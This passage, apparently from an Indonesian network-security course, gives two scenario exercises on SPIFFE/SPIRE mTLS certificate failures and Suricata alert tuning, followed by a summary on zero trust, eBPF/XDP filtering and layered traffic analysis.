12. **Skenario 2**: Sistem mTLS Service Mesh perusahaan Anda gagal memvalidasi koneksi antar dua service (`CheckoutService` ke `PaymentService`). Pesan error pada Envoy menunjukkan: `SSL: certificate_unknown: CA cert verify failed`. Identifikasi akar masalah yang paling mungkin dalam manajemen lifecycle sertifikat SPIFFE/SPIRE dan bagaimana solusinya!
13. **Skenario 3**: Tim QA melaporkan bahwa scanning kerentanan jaringan internal menggunakan open-source port scanner (seperti Nmap) memicu sistem false-positive alert di Suricata yang membanjiri disk SIEM hingga kehabisan kapasitas. Bagaimana Anda mendesain filtering pipeline dan tuning rule threshold untuk memitigasi isu tersebut tanpa mengorbankan keamanan?

---

### 16. Summary

- **Paradigma Keamanan Jaringan Modern**: Telah bergeser dari model *perimeter defense* (berbasis IP/Port perimeter) menuju **Zero Trust Network Architecture (ZTNA)** yang mengandalkan kriptografi identitas dinamis (SPIFFE/mTLS) di level transport dan aplikasi.
- **eBPF dan XDP**: Merupakan lompatan revolusioner dalam rekayasa pertahanan jaringan Linux. Dengan mengeksekusi logika filtering langsung di driver antarmuka data path (sub-mikrodetik), sistem kebal terhadap kehabisan memori atau tabel conntrack Netfilter akibat serangan volumetrik L3/L4.
- **Analisis Lalu Lintas Berlapis**: Pertahanan komprehensif mengintegrasikan kecepatan penanganan paket di level kernel (eBPF) untuk mitigasi volumetrik, inspeksi mendalam asinkron (Suricata/Zeek) untuk ekstraksi tanda tangan ancaman L7, dan otorisasi kontekstual mikro (Envoy Service Mesh) untuk menegakkan prinsip *Least Privilege* pada setiap rute komunikasi.